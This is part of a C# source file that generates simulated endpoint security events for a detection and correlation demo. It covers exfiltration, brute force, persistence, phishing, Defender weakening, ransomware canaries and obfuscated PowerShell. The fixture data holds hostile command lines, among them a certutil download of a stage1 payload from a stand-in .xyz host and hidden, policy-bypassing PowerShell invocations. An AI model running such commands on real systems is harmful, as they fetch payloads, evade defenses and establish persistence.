            "Processus inconnu dans Temp → modification haute entropie dans Documents → renommages .locked → rafale FileBurst (48 fichiers).",
            ["T1486"],
            ThreatType.Ransomware,
            "CHAIN-RANSOMWARE",
            IsMultiStageChain: true,
            events);
    }

    /// <summary>
    /// Scénario 4 — Exfiltration de données (T1560, T1041, T1052) :
    /// création archive volumineuse (export_clients.zip) → branchement clé USB stockage
    /// → résolution DNS domaine rare .xyz → transfert sortant gros volume.
    /// </summary>
    public static AttackScenario BuildScenario4Exfiltration(string hostId, string userId, DateTimeOffset t0)
    {
        var archivePath = $@"C:\Users\{userId}\Documents\export_clients.zip";
        const string exfilDomain = "drop-sync-data.xyz";
        const string pid = "7120";
        const string usbId = @"USBSTOR\DISK&VEN_SANDISK&PROD_ULTRA\4C53000118092011";

        var events = new List<SecurityEvent>
        {
            // 1. Création d'une archive volumineuse (65,3 Mo)
            SecurityEvent.Create(
                hostId, userId, EventCategory.File, EventTypes.FileCreated, archivePath,
                new Dictionary<string, string>
                {
                    [AttributeKeys.FilePath] = archivePath,
                    [AttributeKeys.FileName] = "export_clients.zip",
                    [AttributeKeys.Extension] = ".zip",
                    [AttributeKeys.IsArchive] = "true",
                    [AttributeKeys.FileSize] = "68500000",
                    [AttributeKeys.Entropy] = "7.62",
                    [AttributeKeys.WatchedFolder] = WatchedFolders.Documents,
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ProcessName] = "7z.exe"
                },
                correlationHints: $"pid:{pid},archive:export_clients.zip",
                timestamp: t0),

            // 2. Branchement d'une clé USB de stockage amovible (+12 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Device, EventTypes.UsbInserted, usbId,
                new Dictionary<string, string>
                {
                    [AttributeKeys.DeviceId] = usbId,
                    [AttributeKeys.VendorId] = "0781",
                    [AttributeKeys.ProductId] = "5581",
                    [AttributeKeys.DeviceClass] = "USBSTOR",
                    [AttributeKeys.DeviceName] = "SanDisk Ultra USB 3.0",
                    [AttributeKeys.IsStorage] = "true",
                    [AttributeKeys.IsKeyboard] = "false"
                },
                timestamp: t0.AddSeconds(12)),

            // 3. Résolution DNS d'un domaine rare en .xyz (+26 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Network, EventTypes.DnsQuery, exfilDomain,
                new Dictionary<string, string>
                {
                    [AttributeKeys.Domain] = exfilDomain,
                    [AttributeKeys.DomainAgeDays] = "18",
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ProcessName] = "sync_upload.exe"
                },
                correlationHints: $"pid:{pid},domain:{exfilDomain}",
                timestamp: t0.AddSeconds(26)),

            // 4. Transfert réseau sortant gros volume (68,5 Mo) vers domaine rare .xyz (+40 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Network, EventTypes.NetworkVolume, exfilDomain,
                new Dictionary<string, string>
                {
                    [AttributeKeys.Domain] = exfilDomain,
                    [AttributeKeys.DomainAgeDays] = "18",
                    [AttributeKeys.RemoteIp] = "91.215.85.14",
                    [AttributeKeys.RemotePort] = "443",
                    [AttributeKeys.Protocol] = "tcp",
                    [AttributeKeys.Direction] = "outbound",
                    [AttributeKeys.IsPrivateIp] = "false",
                    [AttributeKeys.BytesSent] = "68500000",
                    [AttributeKeys.BytesReceived] = "24500",
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ProcessName] = "sync_upload.exe"
                },
                correlationHints: $"pid:{pid},domain:{exfilDomain}",
                timestamp: t0.AddSeconds(40))
        };

        return new AttackScenario(
            "S4",
            "4. Exfiltration de données",
            "Création archive volumineuse export_clients.zip (65 Mo) → branchement clé USB stockage → transfert gros volume vers domaine rare .xyz.",
            ["T1560", "T1041", "T1052"],
            ThreatType.Exfiltration,
            "CHAIN-EXFILTRATION",
            IsMultiStageChain: true,
            events);
    }

    /// <summary>
    /// Scénario 5 — Brute force → intrusion (T1110, T1078, T1059) :
    /// 6 échecs de connexion (4625) depuis IP externe → succès de connexion (4624) à 03h15
    /// → lancement processus suspect (cmd.exe / whoami / powershell).
    /// </summary>
    public static AttackScenario BuildScenario5BruteForce(string hostId, string userId, DateTimeOffset t0)
    {
        const string sourceIp = "194.26.135.88";
        var events = new List<SecurityEvent>(8);

        // 1..6 : 6 échecs d'authentification (Windows Event 4625) depuis IP externe (03h14:10 → 03h14:50)
        for (var attempt = 1; attempt <= 6; attempt++)
        {
            events.Add(SecurityEvent.Create(
                hostId, userId, EventCategory.Session, EventTypes.LogonFailure, userId,
                new Dictionary<string, string>
                {
                    [AttributeKeys.WindowsEventId] = "4625",
                    [AttributeKeys.LogonType] = "10",
                    [AttributeKeys.SourceIp] = sourceIp,
                    [AttributeKeys.TargetUser] = userId,
                    [AttributeKeys.FailureReason] = "0xC000006A",
                    [AttributeKeys.FailureCount] = attempt.ToString(CultureInfo.InvariantCulture)
                },
                correlationHints: $"ip:{sourceIp},user:{userId}",
                timestamp: t0.AddSeconds((attempt - 1) * 8)));
        }

        // 7. Succès de connexion (4624) à 03h15:00 (+50 s)
        events.Add(SecurityEvent.Create(
            hostId, userId, EventCategory.Session, EventTypes.LogonSuccess, userId,
            new Dictionary<string, string>
            {
                [AttributeKeys.WindowsEventId] = "4624",
                [AttributeKeys.LogonType] = "10",
                [AttributeKeys.SourceIp] = sourceIp,
                [AttributeKeys.TargetUser] = userId,
                [AttributeKeys.FailureCount] = "6"
            },
            correlationHints: $"ip:{sourceIp},user:{userId}",
            timestamp: t0.AddSeconds(50)));

        // 8. Exécution post-intrusion suspecte (cmd.exe / whoami / powershell) (+65 s)
        events.Add(SecurityEvent.Create(
            hostId, userId, EventCategory.Process, EventTypes.ProcessStart, @"C:\Windows\System32\cmd.exe",
            new Dictionary<string, string>
            {
                [AttributeKeys.ProcessId] = "8104",
                [AttributeKeys.ProcessName] = "cmd.exe",
                [AttributeKeys.ProcessPath] = @"C:\Windows\System32\cmd.exe",
                [AttributeKeys.ParentProcessName] = "explorer.exe",
                [AttributeKeys.CommandLine] = "cmd.exe /c whoami /all & powershell.exe -nop -w hidden -enc VwBoAG8AYQBtAGkAIAAvAGEAbABsAA==",
                [AttributeKeys.Signed] = "true",
                [AttributeKeys.Publisher] = "Microsoft Windows"
            },
            correlationHints: $"ip:{sourceIp},user:{userId}",
            timestamp: t0.AddSeconds(65)));

        return new AttackScenario(
            "S5",
            "5. Brute force → intrusion",
            "6 échecs de connexion RDP (4625) depuis une IP externe → succès de connexion (4624) à 03h15 → reconnaissance cmd.exe / whoami / powershell.",
            ["T1110", "T1078", "T1059"],
            ThreatType.Intrusion,
            "CHAIN-BRUTEFORCE",
            IsMultiStageChain: true,
            events);
    }

    /// <summary>
    /// Scénario 6 — Persistance (T1547.001, T1053.005) :
    /// installation application non signée → ajout clé registre HKCU\...\Run → création tâche planifiée suspecte.
    /// </summary>
    public static AttackScenario BuildScenario6Persistence(string hostId, string userId, DateTimeOffset t0)
    {
        var appBinary = $@"C:\Users\{userId}\AppData\Local\PDFHelperPro\helper.exe";
        var syncScript = $@"C:\Users\{userId}\AppData\Local\PDFHelperPro\sync.ps1";

        var events = new List<SecurityEvent>
        {
            // 1. Installation d'une application non signée d'éditeur inconnu
            SecurityEvent.Create(
                hostId, userId, EventCategory.Installation, EventTypes.AppInstalled, "PDFHelperPro",
                new Dictionary<string, string>
                {
                    [AttributeKeys.AppName] = "PDFHelperPro",
                    [AttributeKeys.AppVersion] = "2.1.0",
                    [AttributeKeys.AppPublisher] = "Unknown Publisher",
                    [AttributeKeys.Signed] = "false",
                    [AttributeKeys.FilePath] = appBinary
                },
                correlationHints: "app:PDFHelperPro",
                timestamp: t0),

            // 2. Ajout d'une clé de démarrage HKCU\...\Run (+15 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Installation, EventTypes.StartupEntryAdded,
                @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\PDFHelperUpdater",
                new Dictionary<string, string>
                {
                    [AttributeKeys.RegistryKey] = @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\PDFHelperUpdater",
                    [AttributeKeys.RegistryValue] = $@"""{appBinary}"" --background",
                    [AttributeKeys.FilePath] = appBinary,
                    [AttributeKeys.Signed] = "false"
                },
                correlationHints: "app:PDFHelperPro",
                timestamp: t0.AddSeconds(15)),

            // 3. Création d'une tâche planifiée suspecte (+32 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Installation, EventTypes.ScheduledTaskCreated, @"\PDFHelperSyncTask",
                new Dictionary<string, string>
                {
                    [AttributeKeys.TaskName] = @"\PDFHelperSyncTask",
                    [AttributeKeys.CommandLine] = $@"powershell.exe -nop -w hidden -ep bypass -File ""{syncScript}""",
                    [AttributeKeys.FilePath] = appBinary
                },
                correlationHints: "app:PDFHelperPro",
                timestamp: t0.AddSeconds(32))
        };

        return new AttackScenario(
            "S6",
            "6. Persistance",
            "Installation d'une application non signée → ajout de clé registre HKCU\\...\\Run → création d'une tâche planifiée PowerShell masquée.",
            ["T1204", "T1547.001", "T1053.005"],
            ThreatType.Persistence,
            "CHAIN-PERSISTENCE",
            IsMultiStageChain: true,
            events);
    }

    /// <summary>
    /// Scénario 7 — Ingénierie sociale (T1566, T1204.002) :
    /// clic lien raccourci → domaine âgé de 2 jours → 3 redirections → téléchargement immédiat exécutable non signé.
    /// </summary>
    public static AttackScenario BuildScenario7SocialEngineering(string hostId, string userId, DateTimeOffset t0)
    {
        const string tabId = "tab-soceng-707";
        const string freshDomain = "portail-rh-prime2026.com";
        const string exeName = "Simulateur_Prime_2026.exe";
        var downloadPath = $@"C:\Users\{userId}\Downloads\{exeName}";

        var events = new List<SecurityEvent>
        {
            // 1. Clic sur un lien raccourci
            SecurityEvent.Create(
                hostId, userId, EventCategory.Browser, EventTypes.LinkClicked, "https://tinyurl.com/prime-rh-2026",
                new Dictionary<string, string>
                {
                    [AttributeKeys.Url] = "https://tinyurl.com/prime-rh-2026",
                    [AttributeKeys.Domain] = "tinyurl.com",
                    [AttributeKeys.IsShortener] = "true",
                    [AttributeKeys.Browser] = "chrome",
                    [AttributeKeys.TabId] = tabId
                },
                correlationHints: $"tab:{tabId}",
                timestamp: t0),

            // 2. Arrivée sur un domaine âgé de 2 jours (+3 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Browser, EventTypes.UrlVisited, $"https://{freshDomain}/validation",
                new Dictionary<string, string>
                {
                    [AttributeKeys.Url] = $"https://{freshDomain}/validation",
                    [AttributeKeys.Domain] = freshDomain,
                    [AttributeKeys.DomainAgeDays] = "2",
                    [AttributeKeys.Referrer] = "https://tinyurl.com/prime-rh-2026",
                    [AttributeKeys.Browser] = "chrome",
                    [AttributeKeys.TabId] = tabId
                },
                correlationHints: $"tab:{tabId},domain:{freshDomain}",
                timestamp: t0.AddSeconds(3)),

            // 3. Chaîne de 3 redirections vers un relais TLD à risque (+5 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Browser, EventTypes.Redirect, "https://dl-bonus-rh.top/go",
                new Dictionary<string, string>
                {
                    [AttributeKeys.Url] = "https://dl-bonus-rh.top/go",
                    [AttributeKeys.Domain] = "dl-bonus-rh.top",
                    [AttributeKeys.RedirectCount] = "3",
                    [AttributeKeys.Referrer] = $"https://{freshDomain}/validation",
                    [AttributeKeys.Browser] = "chrome",
                    [AttributeKeys.TabId] = tabId
                },
                correlationHints: $"tab:{tabId},domain:{freshDomain}",
                timestamp: t0.AddSeconds(5)),

            // 4. Téléchargement immédiat d'un exécutable non signé depuis le domaine âgé de 2 jours (+9 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Browser, EventTypes.DownloadStarted, exeName,
                new Dictionary<string, string>
                {
                    [AttributeKeys.Url] = $"https://{freshDomain}/files/{exeName}",
                    [AttributeKeys.Domain] = freshDomain,
                    [AttributeKeys.DomainAgeDays] = "2",
                    [AttributeKeys.FileName] = exeName,
                    [AttributeKeys.FilePath] = downloadPath,
                    [AttributeKeys.Extension] = ".exe",
                    [AttributeKeys.IsExecutable] = "true",
                    [AttributeKeys.Signed] = "false",
                    [AttributeKeys.Browser] = "chrome",
                    [AttributeKeys.TabId] = tabId
                },
                correlationHints: $"tab:{tabId},domain:{freshDomain}",
                timestamp: t0.AddSeconds(9))
        };

        return new AttackScenario(
            "S7",
            "7. Ingénierie sociale",
            "Clic lien raccourci → domaine âgé de 2 jours → 3 redirections → téléchargement immédiat d'un exécutable non signé.",
            ["T1566", "T1566.002", "T1204.002"],
            ThreatType.SocialEngineering,
            "CHAIN-SOCIAL-ENG",
            IsMultiStageChain: true,
            events);
    }

    /// <summary>
    /// Scénario 8 — Fichier EICAR (test antivirus inoffensif, SHA-256 standard) :
    /// création fichier EICAR + tentative d'exécution immédiatement bloquée (contrôle positif IOC connu).
    /// </summary>
    public static AttackScenario BuildScenario8Eicar(string hostId, string userId, DateTimeOffset t0)
    {
        var eicarPath = $@"C:\Users\{userId}\Downloads\eicar.com";

        var events = new List<SecurityEvent>
        {
            // 1. Création du fichier EICAR dans Downloads
            SecurityEvent.Create(
                hostId, userId, EventCategory.File, EventTypes.FileCreated, eicarPath,
                new Dictionary<string, string>
                {
                    [AttributeKeys.FilePath] = eicarPath,
                    [AttributeKeys.FileName] = "eicar.com",
                    [AttributeKeys.Extension] = ".com",
                    [AttributeKeys.FileSize] = "68",
                    [AttributeKeys.IsExecutable] = "true",
                    [AttributeKeys.WatchedFolder] = WatchedFolders.Downloads,
                    [AttributeKeys.Sha256] = EicarSha256
                },
                correlationHints: $"hash:{EicarSha256}",
                timestamp: t0),

            // 2. Tentative d'exécution du fichier EICAR (+2 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Process, EventTypes.ProcessStart, eicarPath,
                new Dictionary<string, string>
                {
                    [AttributeKeys.ProcessId] = "8840",
                    [AttributeKeys.ProcessName] = "eicar.com",
                    [AttributeKeys.ProcessPath] = eicarPath,
                    [AttributeKeys.ParentProcessName] = "explorer.exe",
                    [AttributeKeys.Signed] = "false",
                    [AttributeKeys.WatchedFolder] = WatchedFolders.Downloads,
                    [AttributeKeys.Sha256] = EicarSha256
                },
                correlationHints: $"hash:{EicarSha256}",
                timestamp: t0.AddSeconds(2))
        };

        return new AttackScenario(
            "S8",
            "8. Fichier EICAR (IOC)",
            "Création et tentative d'exécution du fichier de test antivirus inoffensif EICAR (SHA-256 standard).",
            ["T1204.002"],
            ThreatType.Malware,
            ExpectedChainId: null,
            IsMultiStageChain: false,
            events);
    }

    /// <summary>
    /// Scénario 9 (v2) — Affaiblissement Microsoft Defender + LOLBin (T1562.001, T1218) :
    /// dépôt d'un script dans Temp → ajout d'une exclusion Defender → désactivation temps réel → téléchargement via certutil (Sigma).
    /// </summary>
    public static AttackScenario BuildScenario9DefenderWeakening(string hostId, string userId, DateTimeOffset t0)
    {
        var tempScript = $@"C:\Users\{userId}\AppData\Local\Temp\maint_sync.ps1";
        var exclPath = $@"C:\Users\{userId}\AppData\Local\Temp";

        var events = new List<SecurityEvent>
        {
            SecurityEvent.Create(
                hostId, userId, EventCategory.File, EventTypes.FileCreated, tempScript,
                new Dictionary<string, string>
                {
                    [AttributeKeys.FilePath] = tempScript,
                    [AttributeKeys.FileName] = "maint_sync.ps1",
                    [AttributeKeys.Extension] = ".ps1",
                    [AttributeKeys.FileSize] = "2480",
                    [AttributeKeys.IsExecutable] = "true",
                    [AttributeKeys.WatchedFolder] = WatchedFolders.Temp
                },
                correlationHints: $"file:{tempScript}",
                timestamp: t0),

            SecurityEvent.Create(
                hostId, userId, EventCategory.Defender, EventTypes.DefenderExclusionAdded, exclPath,
                new Dictionary<string, string>
                {
                    [AttributeKeys.WindowsEventId] = "5007",
                    [AttributeKeys.DefenderExclusion] = exclPath,
                    [AttributeKeys.CollectorSource] = "Microsoft-Windows-Windows Defender/Operational"
                },
                correlationHints: $"file:{tempScript}",
                timestamp: t0.AddSeconds(12)),

            SecurityEvent.Create(
                hostId, userId, EventCategory.Defender, EventTypes.DefenderRealtimeDisabled, "WinDefend",
                new Dictionary<string, string>
                {
                    [AttributeKeys.WindowsEventId] = "5001",
                    [AttributeKeys.CollectorSource] = "Microsoft-Windows-Windows Defender/Operational"
                },
                correlationHints: $"file:{tempScript}",
                timestamp: t0.AddSeconds(24)),

            SecurityEvent.Create(
                hostId, userId, EventCategory.Process, EventTypes.ProcessStart, @"C:\Windows\System32\certutil.exe",
                new Dictionary<string, string>
                {
                    [AttributeKeys.ProcessId] = "9120",
                    [AttributeKeys.ProcessName] = "certutil.exe",
                    [AttributeKeys.ProcessPath] = @"C:\Windows\System32\certutil.exe",
                    [AttributeKeys.ParentProcessName] = "cmd.exe",
                    [AttributeKeys.CommandLine] = $@"certutil.exe -urlcache -split -f https://cdn-update-sync.xyz/stage1.bin {exclPath}\stage1.bin",
                    [AttributeKeys.Signed] = "true"
                },
                correlationHints: $"file:{tempScript}",
                timestamp: t0.AddSeconds(36))
        };

        return new AttackScenario(
            "S9",
            "9. Affaiblissement Defender (v2)",
            "Script Temp → ajout exclusion Microsoft Defender → arrêt protection temps réel → LOLBin certutil (règle Sigma).",
            ["T1562.001", "T1218", "T1105"],
            ThreatType.Tampering,
            ExpectedChainId: "CHAIN-DEFENDER-EVASION",
            IsMultiStageChain: true,
            events);
    }

    /// <summary>
    /// Scénario 10 (v2) — Piège Canari anti-ransomware (T1486) :
    /// lancement d'un binaire non signé depuis Temp → altération + chiffrement d'un fichier leurre canari.
    /// </summary>
    public static AttackScenario BuildScenario10CanaryTrap(string hostId, string userId, DateTimeOffset t0)
    {
        var procPath = $@"C:\Users\{userId}\AppData\Local\Temp\doc_sync_helper.exe";
        var canaryPath = $@"C:\Users\{userId}\Documents\00_Plan_Budget_2026.docx";

        var events = new List<SecurityEvent>
        {
            SecurityEvent.Create(
                hostId, userId, EventCategory.Process, EventTypes.ProcessStart, procPath,
                new Dictionary<string, string>
                {
                    [AttributeKeys.ProcessId] = "9210",
                    [AttributeKeys.ProcessName] = "doc_sync_helper.exe",
                    [AttributeKeys.ProcessPath] = procPath,
                    [AttributeKeys.ParentProcessName] = "explorer.exe",
                    [AttributeKeys.Signed] = "false",
                    [AttributeKeys.WatchedFolder] = WatchedFolders.Temp
                },
                correlationHints: $"file:{canaryPath}",
                timestamp: t0),

            SecurityEvent.Create(
                hostId, userId, EventCategory.Canary, EventTypes.CanaryModified, canaryPath,
                new Dictionary<string, string>
                {
                    [AttributeKeys.CanaryId] = "cn-budget-01",
                    [AttributeKeys.FilePath] = canaryPath,
                    [AttributeKeys.Entropy] = "7.88",
                    [AttributeKeys.Reason] = "Modification et hausse d'entropie détectées sur fichier canari anti-ransomware"
                },
                correlationHints: $"file:{canaryPath}",
                timestamp: t0.AddSeconds(4)),

            SecurityEvent.Create(
                hostId, userId, EventCategory.Canary, EventTypes.CanaryEncrypted, canaryPath + ".locked",
                new Dictionary<string, string>
                {
                    [AttributeKeys.CanaryId] = "cn-budget-01",
                    [AttributeKeys.FilePath] = canaryPath + ".locked",
                    [AttributeKeys.OldFilePath] = canaryPath,
                    [AttributeKeys.Entropy] = "7.94",
                    [AttributeKeys.Reason] = "Chiffrement et renommage .locked d'un fichier canari anti-ransomware"
                },
                correlationHints: $"file:{canaryPath}",
                timestamp: t0.AddSeconds(7))
        };

        return new AttackScenario(
            "S10",
            "10. Piège Canari Ransomware (v2)",
            "Processus non signé depuis Temp → modification et chiffrement haute entropie d'un fichier leurre canari.",
            ["T1486"],
            ThreatType.Ransomware,
            ExpectedChainId: "CHAIN-RANSOMWARE",
            IsMultiStageChain: true,
            events);
    }

    /// <summary>
    /// Scénario 11 (v2) — Visibilité script PowerShell 4104 obfusqué (T1059.001, T1027, T1562.006) :
    /// bloc obfusqué (signal modéré) → bloc encodé + téléchargement (escalade corrélée au 2ᵉ événement) → tentative bypass journalisation → C2.
    /// </summary>
    public static AttackScenario BuildScenario11ScriptObfuscation(string hostId, string userId, DateTimeOffset t0)
    {
        const string scriptBlockId = "sb-99401";
        const string pid = "9450";

        var events = new List<SecurityEvent>
        {
            SecurityEvent.Create(
                hostId, userId, EventCategory.Script, EventTypes.PowerShellScriptBlock, scriptBlockId,
                new Dictionary<string, string>
                {
                    [AttributeKeys.WindowsEventId] = "4104",
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ScriptBlockId] = scriptBlockId,
                    [AttributeKeys.ScriptLength] = "1420",
                    [AttributeKeys.Entropy] = "6.45",
                    [AttributeKeys.ScriptObfuscationScore] = "78",
                    [AttributeKeys.ScriptIndicators] = "HighObfuscation",
                    [AttributeKeys.ScriptHash] = "1111111111111111111111111111111111111111111111111111111111114104"
                },
                correlationHints: $"pid:{pid}",
                timestamp: t0),

            SecurityEvent.Create(
                hostId, userId, EventCategory.Script, EventTypes.PowerShellScriptBlock, scriptBlockId + "-2",
                new Dictionary<string, string>
                {
                    [AttributeKeys.WindowsEventId] = "4104",
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ScriptBlockId] = scriptBlockId + "-2",
                    [AttributeKeys.ScriptLength] = "2180",
                    [AttributeKeys.Entropy] = "6.72",
                    [AttributeKeys.ScriptObfuscationScore] = "84",
                    [AttributeKeys.ScriptIndicators] = "EncodedCommand",
                    [AttributeKeys.ScriptHash] = "2222222222222222222222222222222222222222222222222222222222224104"
                },
                correlationHints: $"pid:{pid}",
                timestamp: t0.AddSeconds(9)),

            SecurityEvent.Create(
                hostId, userId, EventCategory.Script, EventTypes.ScriptLoggingBypass, scriptBlockId + "-3",
                new Dictionary<string, string>
                {
                    [AttributeKeys.WindowsEventId] = "4104",
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ScriptBlockId] = scriptBlockId + "-3",
                    [AttributeKeys.ScriptLength] = "980",
                    [AttributeKeys.Entropy] = "5.80",
                    [AttributeKeys.ScriptObfuscationScore] = "88",
                    [AttributeKeys.ScriptIndicators] = "LoggingOrDefenseBypass,DownloadAndExecute",
                    [AttributeKeys.ScriptHash] = "3333333333333333333333333333333333333333333333333333333333334104"
                },
                correlationHints: $"pid:{pid}",
                timestamp: t0.AddSeconds(18)),

            SecurityEvent.Create(
                hostId, userId, EventCategory.Network, EventTypes.NetworkConnection, "198.51.100.77:8443",
                new Dictionary<string, string>
                {
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ProcessName] = "powershell.exe",
                    [AttributeKeys.RemoteIp] = "198.51.100.77",
                    [AttributeKeys.RemotePort] = "8443",
                    [AttributeKeys.Protocol] = "tcp",
                    [AttributeKeys.Direction] = "outbound",
                    [AttributeKeys.IsPrivateIp] = "false",
                    [AttributeKeys.BytesSent] = "8400",
                    [AttributeKeys.BytesReceived] = "32000"
                },
                correlationHints: $"pid:{pid},ip:198.51.100.77",
                timestamp: t0.AddSeconds(24))
        };

        return new AttackScenario(
            "S11",
            "11. Script PowerShell 4104 (v2)",
            "Séquence PowerShell Script Block Logging 4104 : obfuscation → encodage → tentative bypass journalisation → C2.",
            ["T1059.001", "T1027", "T1562.006", "T1071"],
            ThreatType.Malware,
            ExpectedChainId: "CHAIN-SCRIPT-OBFUSCATION",
            IsMultiStageChain: true,
            events);
    }

    /// <summary>
    /// Construit le plan de rejeu temps réel multi-postes (<c>--push-grpc</c>) afin d'alimenter
    /// immédiatement le dashboard, les alertes, les clusters et le graphe de corrélation.
    /// </summary>
    public static IReadOnlyList<SimulatedHostPlan> BuildLiveDemoPlans(string? singleHostOverride = null)
    {
        var now = DateTimeOffset.UtcNow;

        if (!string.IsNullOrWhiteSpace(singleHostOverride))
        {
            var host = singleHostOverride.Trim();
            const string user = "alice.mbarga";
            var events = new List<SecurityEvent>();
            events.AddRange(BuildShortBenignPreamble(host, user, now.AddMinutes(-18)));
            events.AddRange(BuildScenario1Phishing(host, user, now.AddMinutes(-12)).Events);
            events.AddRange(BuildScenario3Ransomware(host, user, now.AddMinutes(-8)).Events);
            events.AddRange(BuildScenario2BadUsb(host, user, now.AddMinutes(-5)).Events);
            events.AddRange(BuildScenario5BruteForce(host, user, now.AddMinutes(-3)).Events);
            events.AddRange(BuildScenario4Exfiltration(host, user, now.AddMinutes(-1)).Events);
            events.Sort((a, b) => a.Timestamp.CompareTo(b.Timestamp));

            return
            [
                new SimulatedHostPlan(host, host, "Microsoft Windows 11 Enterprise 24H2 (Simulé)", user, events)
            ];
        }

        // 3 postes réalistes d'entreprise : Finance, RH, Serveur Comptabilité
        var financeEvents = new List<SecurityEvent>();
        financeEvents.AddRange(BuildShortBenignPreamble("WS-FINANCE-01", "alice.mbarga", now.AddMinutes(-16)));
        financeEvents.AddRange(BuildScenario1Phishing("WS-FINANCE-01", "alice.mbarga", now.AddMinutes(-10)).Events);
        financeEvents.AddRange(BuildScenario3Ransomware("WS-FINANCE-01", "alice.mbarga", now.AddMinutes(-3)).Events);
        financeEvents.Sort((a, b) => a.Timestamp.CompareTo(b.Timestamp));

        var rhEvents = new List<SecurityEvent>();
        rhEvents.AddRange(BuildShortBenignPreamble("WS-RH-02", "paul.ndongo", now.AddMinutes(-14)));
        rhEvents.AddRange(BuildScenario2BadUsb("WS-RH-02", "paul.ndongo", now.AddMinutes(-8)).Events);
        rhEvents.AddRange(BuildScenario7SocialEngineering("WS-RH-02", "paul.ndongo", now.AddMinutes(-2)).Events);
        rhEvents.Sort((a, b) => a.Timestamp.CompareTo(b.Timestamp));

        var comptaEvents = new List<SecurityEvent>();
        comptaEvents.AddRange(BuildShortBenignPreamble("SRV-COMPTA-03", "admin.compta", now.AddMinutes(-15)));
        comptaEvents.AddRange(BuildScenario5BruteForce("SRV-COMPTA-03", "admin.compta", now.AddMinutes(-9)).Events);
        comptaEvents.AddRange(BuildScenario4Exfiltration("SRV-COMPTA-03", "admin.compta", now.AddMinutes(-4)).Events);
        comptaEvents.AddRange(BuildScenario6Persistence("SRV-COMPTA-03", "admin.compta", now.AddMinutes(-1)).Events);
        comptaEvents.Sort((a, b) => a.Timestamp.CompareTo(b.Timestamp));

        return
        [
            new SimulatedHostPlan("WS-FINANCE-01", "WS-FINANCE-01", "Windows 11 Pro 24H2 (Simulé)", "alice.mbarga", financeEvents),
            new SimulatedHostPlan("WS-RH-02", "WS-RH-02", "Windows 11 Pro 24H2 (Simulé)", "paul.ndongo", rhEvents),
            new SimulatedHostPlan("SRV-COMPTA-03", "SRV-COMPTA-03", "Windows Server 2022 Standard (Simulé)", "admin.compta", comptaEvents)
        ];
    }

    private static IReadOnlyList<SecurityEvent> BuildShortBenignPreamble(string hostId, string userId, DateTimeOffset start)
    {
        return
        [
            SecurityEvent.Create(
                hostId, userId, EventCategory.Session, EventTypes.LogonSuccess, userId,
                new Dictionary<string, string>
                {
                    [AttributeKeys.WindowsEventId] = "4624",
                    [AttributeKeys.LogonType] = "2",
                    [AttributeKeys.SourceIp] = "127.0.0.1",
                    [AttributeKeys.TargetUser] = userId
                },
                timestamp: start),
            SecurityEvent.Create(
                hostId, userId, EventCategory.Process, EventTypes.ProcessStart,
                @"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
                new Dictionary<string, string>
                {
                    [AttributeKeys.ProcessId] = "2040",
                    [AttributeKeys.ProcessName] = "OUTLOOK.EXE",
                    [AttributeKeys.ProcessPath] = @"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
                    [AttributeKeys.ParentProcessName] = "explorer.exe",
                    [AttributeKeys.Signed] = "true",
                    [AttributeKeys.Publisher] = "Microsoft Corporation"
                },
                timestamp: start.AddSeconds(15)),
            SecurityEvent.Create(
                hostId, userId, EventCategory.Browser, EventTypes.UrlVisited, "https://learn.microsoft.com/fr-fr/",
                new Dictionary<string, string>
                {
                    [AttributeKeys.Url] = "https://learn.microsoft.com/fr-fr/",
                    [AttributeKeys.Domain] = "learn.microsoft.com",
                    [AttributeKeys.DomainAgeDays] = "10500",
                    [AttributeKeys.Browser] = "msedge"
                },
                timestamp: start.AddSeconds(35)),
            SecurityEvent.Create(
                hostId, userId, EventCategory.File, EventTypes.FileModified,
                $@"C:\Users\{userId}\Documents\rapport_hebdo.docx",
                new Dictionary<string, string>
                {
                    [AttributeKeys.FilePath] = $@"C:\Users\{userId}\Documents\rapport_hebdo.docx",
                    [AttributeKeys.FileName] = "rapport_hebdo.docx",
                    [AttributeKeys.Extension] = ".docx",
                    [AttributeKeys.FileSize] = "92100",
                    [AttributeKeys.Entropy] = "4.42",
                    [AttributeKeys.WatchedFolder] = WatchedFolders.Documents
                },
                timestamp: start.AddSeconds(55)),
            SecurityEvent.Create(
                hostId, userId, EventCategory.Typing, EventTypes.TypingStats, "TypingRhythm",
                new Dictionary<string, string>
                {
                    [AttributeKeys.KeysPerSecond] = "5.1",
                    [AttributeKeys.MeanIntervalMs] = "196.0",
                    [AttributeKeys.IntervalStdDevMs] = "44.5",
                    [AttributeKeys.SampleSize] = "60",
                    [AttributeKeys.Injected] = "false"
                },
                timestamp: start.AddSeconds(75))
        ];
    }
}
